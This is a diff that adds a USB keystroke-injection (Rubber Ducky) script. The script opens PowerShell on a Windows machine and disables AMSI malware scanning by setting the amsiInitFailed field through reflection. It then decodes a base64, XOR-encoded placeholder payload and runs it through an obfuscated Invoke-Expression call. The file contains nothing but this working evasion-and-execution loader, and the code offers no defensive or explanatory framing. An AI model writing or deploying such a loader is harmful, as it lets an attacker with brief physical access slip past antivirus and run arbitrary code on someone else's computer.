@@ -1,0 +1,26 @@
+DELAY 500
+GUI R
+DELAY 250
+STRING powershell
+ENTER
+DELAY 500
+STRING $a=[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils");
+ENTER
+STRING $f=$a.GetField("amsiInitFailed","NonPublic,Static");
+ENTER
+STRING $f.SetValue($null,$true);
+ENTER
+STRING $k=23;
+ENTER
+STRING $e='PAYLOAD_BASE64';
+ENTER
+STRING $b=[Convert]::FromBase64String($e);
+ENTER
+STRING $d=$b|%{$_-bxor$k};
+ENTER
+STRING $s=[System.Text.Encoding]::UTF8.GetString($d);
+ENTER
+STRING $iex='I'+'nv'+'oke-Exp'+'ression';
+ENTER
+STRING &($iex) $s;
+ENTER
